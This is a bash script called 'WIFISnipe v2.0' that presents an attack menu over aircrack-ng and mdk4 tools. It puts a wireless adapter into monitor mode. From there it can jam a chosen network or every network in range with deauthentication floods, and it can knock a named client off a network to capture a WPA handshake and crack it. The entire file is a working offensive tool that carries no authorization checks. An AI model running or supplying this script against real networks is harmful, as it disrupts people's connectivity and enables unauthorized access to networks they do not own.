#!/bin/bash
set -euo pipefail

# =========================
#   COLOR DEFINITIONS
# =========================
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# =========================
#   ASCII BANNER
# =========================
echo -e "${CYAN}"
cat << "EOF"

$$\      $$\ $$\ $$$$$$$$\ $$\  $$$$$$\            $$\                     
$$ | $\  $$ |\__|$$  _____|\__|$$  __$$\           \__|                    
$$ |$$$\ $$ |$$\ $$ |      $$\ $$ /  \__|$$$$$$$\  $$\  $$$$$$\   $$$$$$\  
$$ $$ $$\$$ |$$ |$$$$$\    $$ |\$$$$$$\  $$  __$$\ $$ |$$  __$$\ $$  __$$\ 
$$$$  _$$$$ |$$ |$$  __|   $$ | \____$$\ $$ |  $$ |$$ |$$ /  $$ |$$$$$$$$ |
$$$  / \$$$ |$$ |$$ |      $$ |$$\   $$ |$$ |  $$ |$$ |$$ |  $$ |$$   ____|
$$  /   \$$ |$$ |$$ |      $$ |\$$$$$$  |$$ |  $$ |$$ |$$$$$$$  |\$$$$$$$\ 
\__/     \__|\__|\__|      \__| \______/ \__|  \__|\__|$$  ____/  \_______|
                                                       $$ |                
                                                       $$ |                
                                                       \__|                
                        W I F I S n i p e   v2.0
EOF
echo -e "${NC}"

# =========================
#   TRAP & CLEANUP
# =========================
cleanup() {
    echo -e "\n${YELLOW}[INFO]${NC} Restoring adapter to managed mode..."
    if [[ -n "${adapter:-}" ]]; then
        sudo ifconfig "$adapter" down
        sudo iwconfig "$adapter" mode managed
        sudo ifconfig "$adapter" up
    fi
    exit 0
}
trap cleanup INT

# =========================
#   HELPER FUNCTIONS
# =========================
print_info()    { echo -e "${CYAN}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_error()   { echo -e "${RED}[ERROR]${NC} $1"; }

# =========================
#   ROOT & DEPENDENCY CHECK
# =========================
if [[ $EUID -ne 0 ]]; then
    print_error "This script must be run as root!"
    exit 1
fi

dependencies=(iwconfig ifconfig aireplay-ng airodump-ng mdk4 timeout aircrack-ng)
for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" &>/dev/null; then
        print_error "Missing dependency: $dep"
        exit 1
    fi
done

# =========================
#   VALIDATION FUNCTIONS
# =========================
validate_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]] || { print_error "Invalid MAC format"; exit 1; }
}

validate_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 14 )) || { print_error "Invalid channel"; exit 1; }
}

# =========================
#   MAIN OPERATIONS
# =========================
activate_monitor_mode() {
    print_info "Scanning for wireless adapters..."
    adapters=($(iwconfig 2>/dev/null | grep -o '^[[:alnum:]]\+'))

    if [ ${#adapters[@]} -eq 0 ]; then
        print_error "No wireless adapters found."
        exit 1
    fi

    for i in "${!adapters[@]}"; do
        echo "$((i+1)). ${adapters[i]}"
    done

    read -p "$(echo -e "${CYAN}Select adapter (1-${#adapters[@]}): ${NC}")" choice
    (( choice >= 1 && choice <= ${#adapters[@]} )) || { print_error "Invalid selection"; exit 1; }

    adapter="${adapters[$((choice-1))]}"
    print_success "Using adapter: $adapter"

    sudo ifconfig "$adapter" down
    sudo iwconfig "$adapter" mode monitor
    sudo ifconfig "$adapter" up
}

run_airodump() {
    mkdir -p captures
    print_info "Running airodump-ng for 15 seconds..."
    sudo timeout 15s airodump-ng "$adapter" --write "captures/scan"
    print_success "Scan completed. Saved in captures/scan-*.cap"
}

jam_network_final() {
    sudo iwconfig "$adapter" channel "$channel"
    sudo mdk4 "$adapter" d -B "$bssid"
}

jam_all_networks_final() {
    sudo mdk4 "$adapter" d -s 100
}

crack_password_final() {
    mkdir -p captures
    FILENAME="captures/capture_$(date +%Y%m%d%H%M%S).cap"
    sudo aireplay-ng -0 20 -a "$bssid" -c "$client_mac" "$adapter"
    sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$FILENAME" "$adapter"
    print_success "Handshake saved as $FILENAME"
    print_info "Verifying handshake..."
    aircrack-ng "$FILENAME"
}

# =========================
#   ATTACK MENU
# =========================
attack_menu() {
    while true; do
        echo
        print_info "Choose attack option:"
        echo "  1. Jam Specific Network"
        echo "  2. Jam All Networks"
        echo "  3. Crack Wi-Fi Password"
        echo "  4. Passive Scan Only"
        echo "  5. Exit"
        echo

        read -rp "$(echo -e "${CYAN}Choice: ${NC}")" action_choice
        case "$action_choice" in
            1)
                read -rp "Enter Target BSSID: " bssid; validate_mac "$bssid"
                read -rp "Enter Channel: " channel; validate_channel "$channel"
                jam_network_final ;;
            2)
                jam_all_networks_final ;;
            3)
                read -rp "Enter Target BSSID: " bssid; validate_mac "$bssid"
                read -rp "Enter Channel: " channel; validate_channel "$channel"
                read -rp "Enter Client MAC: " client_mac; validate_mac "$client_mac"
                crack_password_final ;;
            4)
                run_airodump ;;
            5)
                cleanup ;;
            *)
                print_error "Invalid option" ;;
        esac
    done
}

# =========================
#   SCRIPT EXECUTION
# =========================
activate_monitor_mode
attack_menu
